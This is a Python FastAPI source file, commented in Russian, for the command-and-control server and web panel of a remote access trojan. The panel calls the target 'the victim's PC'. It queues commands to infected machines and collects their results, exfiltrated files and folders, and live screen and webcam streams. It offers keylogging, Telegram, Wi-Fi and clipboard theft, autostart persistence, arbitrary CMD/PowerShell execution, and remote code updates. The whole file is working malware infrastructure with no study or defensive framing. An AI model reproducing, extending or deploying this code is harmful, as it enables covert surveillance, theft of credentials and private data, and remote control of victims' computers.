import os
import json
import time
import base64
import shutil
from fastapi import FastAPI, Request, HTTPException
from fastapi.responses import HTMLResponse, FileResponse, JSONResponse
from fastapi.templating import Jinja2Templates
from pydantic import BaseModel
from typing import Dict, List, Optional
import uvicorn
from datetime import datetime

# --- КОНФИГ ---
app = FastAPI(title="RAT Control Panel", version="1.0")
templates = Jinja2Templates(directory="templates")

# Создаём папки
os.makedirs("uploads", exist_ok=True)
os.makedirs("sessions", exist_ok=True)
os.makedirs("templates", exist_ok=True)
os.makedirs("updates", exist_ok=True)

# --- ХРАНИЛИЩЕ КЛИЕНТОВ ---
clients: Dict[str, Dict] = {}
streams: Dict[str, Dict] = {}

# --- МОДЕЛИ ДАННЫХ ---
class RegisterPayload(BaseModel):
    id: str
    version: Optional[str] = "1.0"

class CommandPayload(BaseModel):
    client_id: str
    command: str

class ResultPayload(BaseModel):
    id: str
    result: str

class UploadPayload(BaseModel):
    id: str
    type: str
    filename: str
    data: str

class UpdatePayload(BaseModel):
    client_id: str
    code: str

# --- HTML ИНТЕРФЕЙС (встроенный) ---
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RAT Control Panel</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0a0a1a; color: #fff; padding: 20px; }
        .container { max-width: 1400px; margin: 0 auto; }
        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; border-bottom: 1px solid #333; padding-bottom: 15px; }
        .header h1 { color: #00ff88; font-size: 28px; }
        .header .status { color: #888; font-size: 14px; }
        .btn { background: #1a3a5c; border: none; color: #fff; padding: 8px 16px; border-radius: 4px; cursor: pointer; transition: 0.3s; font-size: 13px; }
        .btn:hover { background: #2a5a8c; transform: scale(1.02); }
        .btn-success { background: #00aa55; }
        .btn-success:hover { background: #00cc66; }
        .btn-danger { background: #aa3333; }
        .btn-danger:hover { background: #cc4444; }
        .btn-warning { background: #aa8800; }
        .btn-warning:hover { background: #ccaa00; }
        .btn-purple { background: #6a3a9a; }
        .btn-purple:hover { background: #8a4aba; }
        .btn-sm { padding: 4px 10px; font-size: 11px; }
        
        .clients-grid { display: grid; grid-template-columns: 300px 1fr; gap: 20px; }
        .clients-list { background: #14142a; border-radius: 8px; padding: 15px; max-height: 80vh; overflow-y: auto; }
        .client-item { padding: 12px; margin-bottom: 8px; background: #1a1a3a; border-radius: 4px; cursor: pointer; transition: 0.3s; border-left: 3px solid #444; }
        .client-item:hover { background: #222255; }
        .client-item.active { border-left-color: #00ff88; background: #1a2a4a; }
        .client-item.online { border-left-color: #00ff88; }
        .client-item.offline { border-left-color: #ff4444; opacity: 0.6; }
        .client-item .name { font-weight: bold; font-size: 14px; }
        .client-item .info { font-size: 11px; color: #888; margin-top: 4px; }
        .client-item .badge { display: inline-block; padding: 2px 8px; border-radius: 12px; font-size: 10px; margin-left: 8px; }
        .badge.online { background: #00aa55; }
        .badge.offline { background: #aa3333; }
        
        .panel { background: #14142a; border-radius: 8px; padding: 20px; }
        .panel-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
        .panel-header h2 { font-size: 18px; color: #00ff88; }
        .panel-tabs { display: flex; gap: 8px; margin-bottom: 15px; flex-wrap: wrap; }
        .tab-btn { padding: 6px 14px; background: #1a1a3a; border: 1px solid #333; border-radius: 4px; color: #888; cursor: pointer; transition: 0.3s; font-size: 12px; }
        .tab-btn:hover { background: #2a2a5a; }
        .tab-btn.active { background: #2a4a7a; color: #fff; border-color: #4a7aaa; }
        .tab-content { display: none; }
        .tab-content.active { display: block; }
        
        .cmd-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 8px; margin: 10px 0; }
        .cmd-btn { padding: 8px; background: #1a2a4a; border: 1px solid #2a3a5a; border-radius: 4px; color: #ccc; cursor: pointer; transition: 0.3s; text-align: center; font-size: 12px; }
        .cmd-btn:hover { background: #2a4a6a; color: #fff; }
        .cmd-btn.danger { border-color: #8a2222; }
        .cmd-btn.danger:hover { background: #6a2222; }
        
        .input { background: #0a0a1a; color: #fff; border: 1px solid #333; border-radius: 4px; padding: 8px; width: 100%; }
        .input-sm { width: auto; display: inline-block; }
        .textarea { width: 100%; background: #0a0a1a; color: #fff; border: 1px solid #333; border-radius: 4px; padding: 10px; font-family: monospace; resize: vertical; }
        
        .results-box { background: #0a0a1a; padding: 12px; border-radius: 4px; max-height: 400px; overflow-y: auto; font-family: monospace; font-size: 12px; white-space: pre-wrap; border: 1px solid #222; margin-top: 10px; }
        .stream-box { background: #0a0a1a; border-radius: 4px; border: 1px solid #222; padding: 10px; text-align: center; min-height: 200px; display: flex; align-items: center; justify-content: center; }
        .stream-box img { max-width: 100%; max-height: 400px; border-radius: 4px; }
        .stream-box .placeholder { color: #666; }
        
        .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); }
        .modal-content { background: #1a1a3a; margin: 5% auto; padding: 30px; width: 70%; max-width: 800px; border-radius: 8px; max-height: 80vh; overflow-y: auto; }
        .modal-close { float: right; font-size: 28px; cursor: pointer; color: #888; }
        .modal-close:hover { color: #fff; }
        
        .flex { display: flex; gap: 8px; align-items: center; }
        .flex-wrap { flex-wrap: wrap; }
        .mt-10 { margin-top: 10px; }
        .mb-10 { margin-bottom: 10px; }
        .w-full { width: 100%; }
        .w-70 { width: 70%; }
        .w-40 { width: 40%; }
        .w-30 { width: 30%; }
        .text-muted { color: #888; font-size: 12px; }
        
        @media (max-width: 768px) {
            .clients-grid { grid-template-columns: 1fr; }
            .cmd-grid { grid-template-columns: 1fr 1fr; }
            .flex { flex-wrap: wrap; }
            .w-70, .w-40, .w-30 { width: 100%; }
        }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>🔥 RAT Control Panel</h1>
        <div>
            <span class="status" id="status-text">Онлайн: 0</span>
            <button class="btn btn-success" onclick="refreshClients()" style="margin-left:10px;">🔄 Обновить</button>
        </div>
    </div>
    
    <div class="clients-grid">
        <div class="clients-list" id="clients-list">
            <div style="color:#666; text-align:center; padding:20px;">Загрузка клиентов...</div>
        </div>
        
        <div class="panel" id="panel">
            <div class="panel-header">
                <h2 id="panel-title">Выберите клиента</h2>
                <div>
                    <button class="btn btn-danger btn-sm" onclick="deleteClient()" style="display:none;" id="btn-delete">🗑 Удалить</button>
                </div>
            </div>
            
            <div id="panel-content">
                <div style="color:#666; text-align:center; padding:40px;">
                    Нажмите на клиента слева для управления
                </div>
            </div>
        </div>
    </div>
</div>

<!-- Модальное окно для обновления RAT -->
<div id="update-modal" class="modal">
    <div class="modal-content">
        <span class="modal-close" onclick="closeUpdateModal()">&times;</span>
        <h2 style="color:#00ff88;">🔄 Обновление RAT</h2>
        <p class="text-muted" style="margin:10px 0;">Вставьте новый код для клиента <span id="update-client-id" style="color:#fff;"></span></p>
        <textarea id="update-code" class="textarea" rows="20" style="font-size:11px;"></textarea>
        <div class="flex mt-10">
            <button class="btn btn-success" onclick="sendUpdate()">📤 Отправить обновление</button>
            <button class="btn" onclick="closeUpdateModal()">Отмена</button>
        </div>
    </div>
</div>

<!-- Модальное окно для загруженных файлов -->
<div id="files-modal" class="modal">
    <div class="modal-content">
        <span class="modal-close" onclick="document.getElementById('files-modal').style.display='none'">&times;</span>
        <h2 style="color:#00ff88;">📁 Загруженные файлы</h2>
        <div id="files-list" class="mt-10"></div>
    </div>
</div>

<script>
let currentClient = null;
let updateInterval = null;

// --- КЛИЕНТЫ ---
function refreshClients() {
    fetch('/api/clients')
        .then(r => r.json())
        .then(data => {
            const list = document.getElementById('clients-list');
            list.innerHTML = '';
            if (data.clients.length === 0) {
                list.innerHTML = '<div style="color:#666; text-align:center; padding:20px;">Нет активных клиентов</div>';
                document.getElementById('status-text').textContent = 'Онлайн: 0';
                return;
            }
            data.clients.forEach(c => {
                const div = document.createElement('div');
                div.className = 'client-item ' + (c.online ? 'online' : 'offline');
                if (currentClient === c.id) div.classList.add('active');
                
                const statusText = c.online ? '🟢 Онлайн' : '🔴 Оффлайн';
                const lastSeen = new Date(c.last_seen * 1000).toLocaleString();
                
                div.innerHTML = '<div class="name">' + c.id + '</div>' +
                    '<div class="info">' + statusText + ' • ' + c.results_count + ' результатов<br>Версия: ' + c.version + ' • ' + lastSeen + '</div>';
                div.onclick = function() { selectClient(c.id); };
                list.appendChild(div);
            });
            
            const online = data.clients.filter(c => c.online).length;
            document.getElementById('status-text').textContent = 'Онлайн: ' + online + '/' + data.clients.length;
        })
        .catch(() => {});
}

// --- ВЫБОР КЛИЕНТА ---
function selectClient(id) {
    currentClient = id;
    document.getElementById('panel-title').textContent = 'Управление: ' + id;
    document.getElementById('btn-delete').style.display = 'inline-block';
    
    document.getElementById('panel-content').innerHTML = `
        <div class="panel-tabs">
            <button class="tab-btn active" onclick="switchTab('tab-commands', this)">📡 Команды</button>
            <button class="tab-btn" onclick="switchTab('tab-files', this)">📁 Файлы</button>
            <button class="tab-btn" onclick="switchTab('tab-stream', this)">📺 Стрим</button>
            <button class="tab-btn" onclick="switchTab('tab-update', this)">🔄 Обновление</button>
            <button class="tab-btn" onclick="switchTab('tab-results', this)">📋 Результаты</button>
            <button class="tab-btn" onclick="switchTab('tab-uploads', this)">📦 Загрузки</button>
        </div>
        
        <!-- Вкладка: Команды -->
        <div id="tab-commands" class="tab-content active">
            <h4>Быстрые команды</h4>
            <div class="cmd-grid">
                <div class="cmd-btn" onclick="sendCmd('/sysinfo')">💻 Инфо</div>
                <div class="cmd-btn" onclick="sendCmd('/processes')">📊 Процессы</div>
                <div class="cmd-btn" onclick="sendCmd('/screenshot')">📸 Скриншот</div>
                <div class="cmd-btn" onclick="sendCmd('/wifi')">📶 Wi-Fi</div>
                <div class="cmd-btn" onclick="sendCmd('/telegram')">✈️ Telegram</div>
                <div class="cmd-btn" onclick="sendCmd('/clipboard')">📋 Буфер</div>
                <div class="cmd-btn" onclick="sendCmd('/screen_start')">📺 Экран ВКЛ</div>
                <div class="cmd-btn" onclick="sendCmd('/screen_stop')">📺 Экран ВЫКЛ</div>
                <div class="cmd-btn" onclick="sendCmd('/camera_start')">📷 Камера ВКЛ</div>
                <div class="cmd-btn" onclick="sendCmd('/camera_stop')">📷 Камера ВЫКЛ</div>
                <div class="cmd-btn" onclick="sendCmd('/photo')">📷 Фото</div>
                <div class="cmd-btn" onclick="sendCmd('/keylog_start')">⌨️ Кейлог ВКЛ</div>
                <div class="cmd-btn" onclick="sendCmd('/keylog_stop')">⌨️ Кейлог ВЫКЛ</div>
                <div class="cmd-btn" onclick="sendCmd('/autostart_add')">🔒 Автозапуск +</div>
                <div class="cmd-btn" onclick="sendCmd('/autostart_remove')">🔓 Автозапуск -</div>
                <div class="cmd-btn danger" onclick="sendCmd('/uninstall')">💣 Удалить RAT</div>
                <div class="cmd-btn" onclick="sendCmd('/restore')">♻️ Восстановить</div>
            </div>
            
            <h4 class="mt-10">Произвольная команда</h4>
            <div class="flex">
                <input id="custom-cmd" class="input w-70" placeholder="/cmd dir или /ps Get-Process">
                <button class="btn btn-success" onclick="sendCustomCmd()">Выполнить</button>
            </div>
            <div class="text-muted">/cmd [команда] - CMD | /ps [команда] - PowerShell | /kill [PID] | /list [путь] [глубина]</div>
        </div>
        
        <!-- Вкладка: Файлы -->
        <div id="tab-files" class="tab-content">
            <h4>📁 Работа с файлами</h4>
            <div class="flex mt-10">
                <input id="file-path" class="input w-70" placeholder="Путь (например C:\\\\Users)">
                <button class="btn" onclick="sendCmd('/list ' + document.getElementById('file-path').value)">📂 Показать</button>
            </div>
            <div class="flex mt-10">
                <input id="send-file-path" class="input w-70" placeholder="Путь к файлу для отправки">
                <button class="btn btn-success" onclick="sendCmd('/sendfile ' + document.getElementById('send-file-path').value)">📤 Отправить</button>
            </div>
            <div class="flex mt-10">
                <input id="send-folder-path" class="input w-70" placeholder="Путь к папке для отправки">
                <button class="btn btn-success" onclick="sendCmd('/sendfolder ' + document.getElementById('send-folder-path').value)">📤 Отправить папку</button>
            </div>
            <div class="flex mt-10">
                <input id="download-url" class="input w-40" placeholder="URL для скачивания">
                <input id="download-dest" class="input w-30" placeholder="Путь сохранения">
                <button class="btn btn-warning" onclick="sendCmd('/download ' + document.getElementById('download-url').value + ' ' + document.getElementById('download-dest').value)">⬇️ Скачать</button>
            </div>
        </div>
        
        <!-- Вкладка: Стрим -->
        <div id="tab-stream" class="tab-content">
            <h4>📺 Трансляция</h4>
            <div style="display:grid; grid-template-columns:1fr 1fr; gap:10px;">
                <div>
                    <h5>Экран</h5>
                    <div class="flex">
                        <button class="btn btn-success btn-sm" onclick="sendCmd('/screen_start')">▶️ ВКЛ</button>
                        <button class="btn btn-danger btn-sm" onclick="sendCmd('/screen_stop')">⏹️ ВЫКЛ</button>
                    </div>
                    <div class="stream-box" id="screen-stream">
                        <span class="placeholder">Ожидание трансляции...</span>
                    </div>
                </div>
                <div>
                    <h5>Камера</h5>
                    <div class="flex">
                        <button class="btn btn-success btn-sm" onclick="sendCmd('/camera_start')">▶️ ВКЛ</button>
                        <button class="btn btn-danger btn-sm" onclick="sendCmd('/camera_stop')">⏹️ ВЫКЛ</button>
                    </div>
                    <div class="stream-box" id="camera-stream">
                        <span class="placeholder">Ожидание трансляции...</span>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Вкладка: Обновление -->
        <div id="tab-update" class="tab-content">
            <h4>🔄 Обновление RAT</h4>
            <p class="text-muted">Обновит код на ПК жертвы. Вставьте новый код ниже:</p>
            <div class="flex mt-10">
                <button class="btn btn-warning" onclick="openUpdateModal()">📝 Открыть редактор кода</button>
                <button class="btn btn-success" onclick="fetchUpdateCode()">📥 Загрузить код с сервера</button>
                <button class="btn btn-purple" onclick="saveUpdateCode()">💾 Сохранить код на сервере</button>
            </div>
            <div class="mt-10">
                <textarea id="update-code-preview" class="textarea" rows="8" style="font-size:11px;" placeholder="Код для обновления..."></textarea>
            </div>
        </div>
        
        <!-- Вкладка: Результаты -->
        <div id="tab-results" class="tab-content">
            <h4>📋 Результаты <button class="btn btn-danger btn-sm" onclick="clearResults()">Очистить</button></h4>
            <div id="results-box" class="results-box">Ожидание результатов...</div>
        </div>
        
        <!-- Вкладка: Загрузки -->
        <div id="tab-uploads" class="tab-content">
            <h4>📦 Загруженные файлы</h4>
            <button class="btn btn-success btn-sm" onclick="loadUploads()">🔄 Обновить список</button>
            <div id="uploads-box" class="results-box mt-10">Загрузка...</div>
        </div>
    `;
    
    getResults();
    loadUploads();
    if (updateInterval) clearInterval(updateInterval);
    updateInterval = setInterval(() => {
        getResults();
        updateStreams();
    }, 3000);
    
    refreshClients();
}

// --- ПЕРЕКЛЮЧЕНИЕ ВКЛАДОК ---
function switchTab(tabId, btn) {
    document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
    document.getElementById(tabId).classList.add('active');
    if (btn) btn.classList.add('active');
}

// --- ОТПРАВКА КОМАНД ---
function sendCmd(cmd) {
    if (!currentClient) {
        alert('Выберите клиента');
        return;
    }
    fetch('/api/command', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({client_id: currentClient, command: cmd})
    })
    .then(r => r.json())
    .then(data => {
        if (data.status === 'sent') {
            const box = document.getElementById('results-box');
            if (box) box.innerHTML = '[' + new Date().toLocaleTimeString() + '] ✓ Отправлено: ' + cmd + '\n\nОжидание ответа...';
        }
    });
}

function sendCustomCmd() {
    const cmd = document.getElementById('custom-cmd').value;
    if (cmd) sendCmd(cmd);
}

// --- РЕЗУЛЬТАТЫ ---
function getResults() {
    if (!currentClient) return;
    fetch('/api/results/' + currentClient)
        .then(r => r.json())
        .then(data => {
            const box = document.getElementById('results-box');
            if (!box) return;
            if (data.results && data.results.length > 0) {
                box.innerHTML = data.results.map(r => '[' + r.time + '] ' + r.result).join('\n\n');
            } else {
                box.innerHTML = 'Нет результатов';
            }
        });
}

function clearResults() {
    if (!currentClient) return;
    fetch('/api/clean_results/' + currentClient, {method: 'POST'})
        .then(() => getResults());
}

// --- УДАЛЕНИЕ КЛИЕНТА ---
function deleteClient() {
    if (!currentClient) return;
    if (!confirm('Удалить клиента ' + currentClient + '?')) return;
    fetch('/api/delete_client/' + currentClient, {method: 'POST'})
        .then(() => {
            currentClient = null;
            document.getElementById('panel-content').innerHTML = '<div style="color:#666; text-align:center; padding:40px;">Клиент удалён</div>';
            refreshClients();
        });
}

// --- СТРИМЫ ---
function updateStreams() {
    if (!currentClient) return;
    
    fetch('/api/stream/' + currentClient + '/screen')
        .then(r => r.json())
        .then(data => {
            const box = document.getElementById('screen-stream');
            if (!box) return;
            if (data.data) {
                box.innerHTML = '<img src="data:image/png;base64,' + data.data + '" alt="Экран">';
            }
        })
        .catch(() => {});
    
    fetch('/api/stream/' + currentClient + '/camera')
        .then(r => r.json())
        .then(data => {
            const box = document.getElementById('camera-stream');
            if (!box) return;
            if (data.data) {
                box.innerHTML = '<img src="data:image/jpeg;base64,' + data.data + '" alt="Камера">';
            }
        })
        .catch(() => {});
}

// --- ЗАГРУЖЕННЫЕ ФАЙЛЫ ---
function loadUploads() {
    fetch('/api/uploads')
        .then(r => r.json())
        .then(data => {
            const box = document.getElementById('uploads-box');
            if (!box) return;
            if (data.files && data.files.length > 0) {
                box.innerHTML = data.files.map(f => 
                    '📄 ' + f.name + ' (' + (f.size/1024).toFixed(1) + ' KB) [' + f.date + '] <a href="' + f.url + '" target="_blank" style="color:#00ff88;">Скачать</a>'
                ).join('\n');
            } else {
                box.innerHTML = 'Нет загруженных файлов';
            }
        });
}

// --- ОБНОВЛЕНИЕ RAT ---
function openUpdateModal() {
    if (!currentClient) {
        alert('Выберите клиента');
        return;
    }
    document.getElementById('update-client-id').textContent = currentClient;
    document.getElementById('update-modal').style.display = 'block';
}

function closeUpdateModal() {
    document.getElementById('update-modal').style.display = 'none';
}

function sendUpdate() {
    const code = document.getElementById('update-code').value;
    if (!code) {
        alert('Введите код');
        return;
    }
    if (!currentClient) return;
    
    fetch('/api/update', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({client_id: currentClient, code: code})
    })
    .then(r => r.json())
    .then(data => {
        if (data.status === 'sent') {
            alert('Обновление отправлено!');
            closeUpdateModal();
        }
    });
}

function fetchUpdateCode() {
    if (!currentClient) return;
    fetch('/api/get_update_code/' + currentClient)
        .then(r => r.json())
        .then(data => {
            document.getElementById('update-code-preview').value = data.code || '';
        });
}

function saveUpdateCode() {
    const code = document.getElementById('update-code-preview').value;
    if (!code) {
        alert('Введите код');
        return;
    }
    fetch('/api/save_update_code', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({code: code})
    })
    .then(r => r.json())
    .then(data => {
        if (data.status === 'ok') {
            alert('Код сохранён на сервере!');
        }
    });
}

// --- ИНИЦИАЛИЗАЦИЯ ---
refreshClients();
setInterval(refreshClients, 10000);
</script>
</body>
</html>
'''

# Сохраняем HTML в шаблон
with open("templates/index.html", "w", encoding='utf-8') as f:
    f.write(HTML_TEMPLATE)

# --- ЭНДПОИНТЫ ДЛЯ РАТ ---

@app.post("/register")
async def register(payload: RegisterPayload):
    """Регистрация нового клиента"""
    if payload.id not in clients:
        clients[payload.id] = {
            "last_seen": time.time(),
            "commands": [],
            "results": [],
            "version": payload.version,
            "first_seen": datetime.now().isoformat()
        }
    else:
        clients[payload.id]["last_seen"] = time.time()
    return {"status": "ok", "server_version": "1.0"}

@app.get("/cmd/{client_id}")
async def get_commands(client_id: str):
    """Клиент запрашивает команды"""
    if client_id not in clients:
        return []
    cmds = clients[client_id]["commands"]
    clients[client_id]["commands"] = []
    clients[client_id]["last_seen"] = time.time()
    return cmds

@app.post("/result")
async def post_result(payload: ResultPayload):
    """Клиент отправляет результат выполнения"""
    if payload.id in clients:
        clients[payload.id]["results"].append({
            "time": datetime.now().isoformat(),
            "result": payload.result
        })
        if len(clients[payload.id]["results"]) > 100:
            clients[payload.id]["results"] = clients[payload.id]["results"][-100:]
    return {"status": "ok"}

@app.post("/upload")
async def upload_file(payload: UploadPayload):
    """Клиент загружает файл/папку на сервер"""
    try:
        data = base64.b64decode(payload.data)
        filename = payload.id + "_" + str(int(time.time())) + "_" + payload.filename
        filepath = os.path.join("uploads", filename)
        
        with open(filepath, 'wb') as f:
            f.write(data)
        
        return {"status": "ok", "filename": filename}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/stream")
async def handle_stream(payload: dict):
    """Приём стрима (скриншот или камера)"""
    client_id = payload.get("id")
    stream_type = payload.get("type")
    data = payload.get("data")
    
    if not client_id or not data:
        return {"status": "error"}
    
    if client_id not in streams:
        streams[client_id] = {}
    
    if stream_type == "screen":
        streams[client_id]["screen"] = data
    elif stream_type == "camera":
        streams[client_id]["camera"] = data
    
    return {"status": "ok"}

# --- ЭНДПОИНТЫ ДЛЯ GUI ---

@app.get("/", response_class=HTMLResponse)
async def index(request: Request):
    """Главная страница управления"""
    return templates.TemplateResponse("index.html", {"request": request})

@app.get("/api/clients")
async def list_clients():
    """Список всех клиентов"""
    client_list = []
    for cid, data in clients.items():
        client_list.append({
            "id": cid,
            "last_seen": data["last_seen"],
            "version": data.get("version", "unknown"),
            "first_seen": data.get("first_seen", "unknown"),
            "online": (time.time() - data["last_seen"]) < 60,
            "results_count": len(data.get("results", []))
        })
    return {"clients": client_list}

@app.get("/api/results/{client_id}")
async def get_results(client_id: str):
    """Получить результаты клиента"""
    if client_id not in clients:
        return {"results": []}
    results = clients[client_id].get("results", [])
    return {"results": results}

@app.post("/api/command")
async def send_command(payload: CommandPayload):
    """Отправить команду клиенту"""
    if payload.client_id not in clients:
        raise HTTPException(status_code=404, detail="Клиент не найден")
    clients[payload.client_id]["commands"].append(payload.command)
    return {"status": "sent", "command": payload.command}

@app.get("/api/stream/{client_id}/{stream_type}")
async def get_stream(client_id: str, stream_type: str):
    """Получить последний кадр стрима (для отображения)"""
    if client_id not in streams:
        return JSONResponse(content={"error": "Нет данных"}, status_code=404)
    if stream_type not in streams[client_id]:
        return JSONResponse(content={"error": "Нет данных для " + stream_type}, status_code=404)
    
    data = streams[client_id][stream_type]
    return JSONResponse(content={"data": data})

@app.post("/api/update")
async def update_rat(payload: UpdatePayload):
    """Обновить RAT у клиента"""
    if payload.client_id not in clients:
        raise HTTPException(status_code=404, detail="Клиент не найден")
    
    clients[payload.client_id]["commands"].append("/update " + payload.code)
    return {"status": "sent", "client_id": payload.client_id}

@app.get("/api/download/{filename}")
async def download_file(filename: str):
    """Скачать загруженный файл"""
    filepath = os.path.join("uploads", filename)
    if not os.path.exists(filepath):
        raise HTTPException(status_code=404, detail="Файл не найден")
    return FileResponse(filepath, filename=filename)

@app.post("/api/clean_results/{client_id}")
async def clean_results(client_id: str):
    """Очистить результаты клиента"""
    if client_id in clients:
        clients[client_id]["results"] = []
    return {"status": "ok"}

@app.post("/api/delete_client/{client_id}")
async def delete_client(client_id: str):
    """Удалить клиента из списка"""
    if client_id in clients:
        del clients[client_id]
    if client_id in streams:
        del streams[client_id]
    return {"status": "ok"}

@app.get("/api/get_update_code/{client_id}")
async def get_update_code(client_id: str):
    """Получить текущий код RAT для обновления"""
    try:
        with open("updates/update_code.txt", "r", encoding='utf-8') as f:
            code = f.read()
        return {"code": code}
    except:
        return {"code": ""}

@app.post("/api/save_update_code")
async def save_update_code(payload: dict):
    """Сохранить новый код для обновления"""
    code = payload.get("code", "")
    try:
        with open("updates/update_code.txt", "w", encoding='utf-8') as f:
            f.write(code)
        return {"status": "ok"}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/uploads")
async def list_uploads():
    """Список загруженных файлов"""
    files = []
    for fname in os.listdir("uploads"):
        filepath = os.path.join("uploads", fname)
        if os.path.isfile(filepath):
            stat = os.stat(filepath)
            files.append({
                "name": fname,
                "size": stat.st_size,
                "date": datetime.fromtimestamp(stat.st_mtime).strftime("%Y-%m-%d %H:%M:%S"),
                "url": "/api/download/" + fname
            })
    files.sort(key=lambda x: x['date'], reverse=True)
    return {"files": files}

# --- ЗАПУСК ---
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)